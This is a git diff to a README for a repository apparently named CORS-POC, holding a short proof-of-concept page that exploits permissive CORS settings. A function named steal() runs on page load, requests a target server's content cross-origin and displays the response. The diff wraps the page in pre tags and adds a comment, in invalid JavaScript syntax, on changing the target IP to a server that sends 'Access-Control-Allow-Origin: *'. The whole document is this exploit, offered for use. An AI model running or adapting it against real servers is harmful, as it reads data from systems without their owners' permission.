@@ -1,5 +1,6 @@
 # CORS-POC
 
+<pre>
 <html>
     <head>
     <script>
@@ -10,6 +11,7 @@
                     alert(r.responseText);
                 }
             };
+            #Chanage server IP below look for Access-Control-Allow-Origin: *
             r.open("GET", "http://192.168.78.135", true);
             r.send();
         }
@@ -18,3 +20,4 @@
     <body onload="steal()">
     </body>
 </html>
+</pre>
